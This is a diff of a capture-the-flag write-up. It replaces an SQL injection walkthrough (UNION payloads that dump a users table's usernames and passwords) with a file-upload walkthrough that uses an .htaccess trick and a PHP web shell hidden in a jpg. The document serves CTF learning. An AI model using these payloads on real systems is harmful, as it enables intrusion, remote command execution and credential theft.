@@ -1,39 +1,31 @@
 # Reconnaissance
-![i1](dbmovie.jpg)
- 
-This challenge offers us a movie site with a search bar, we immediately guess that there is surely a possibility of sql injection.
 
-![i2](dbmovie2.jpg)
+With this challenge we immediately guess that there's a file upload vulnerability
+
+![i2](13.jpg)
+
+After uploading an image, we see it in uploads/nameofthefile.jpg
+
+![i2](14.jpg)
 
  # Exploitation
 
-The first thing we see that seems interesting to exploit is the search bar. Let’s
-try a classic sql injection that will surely cause an error due to its large number.
+First we'll upload an .htaccess that will allow us to upload jpg files but interpreted as php. The trick here is to inject some php code in the jpg file, we can use burpsuite for it.
+The .htaccess file contains `AddType application/x-httpd-php .jpg`.
 
-![i3](1.jpg)
-![i3](2.jpg)
+We can then upload an image with the following code giving us a web shell:
+`
+<?php
+if(isset($_GET["cmd"])) 
+        system($_GET["cmd"]);
+?>`
 
-Now we have a precious information, the DBMS is sqlite3, we can adapt our
-injections to it. Let’s try a more serious injection :
+![i2](17.jpg)
 
-`'union select name,sql,null,null,null,null from sqlite_master where type='table' --; `
+Let's gooo our getshell works we can use the command we want, starting with a classic ls and some others commands until we reach the flag by exploring.
 
-![i3](3.jpg)
+![i2](18.jpg)
+![i2](19.jpg)
+![i2](20.jpg)
 
-I put some null values in the injection for testing by adding a null until it
-doesn’t print the error ”SELECTs to the left and right of UNION do not have
-the same number of result columns”. The goal was to have the same number
-of columns with the select executed in the site for searching movies.
-
-![i3](4.jpg)
-
-The trick here was to pay attention to the source code because some
-interesting sql code (create table ...) was there, we get the names of the
-columns and we’ll simply do a final injection to get the data that we want
-from users, result in the next page :
-
-`'union select username,password,null,null,null,null from users --`
-
-![i3](5.jpg)
-
-Flagged ! ZiTF{eLcVAVdDEfNmLjLEWGqF} in the source code
+Flagged !
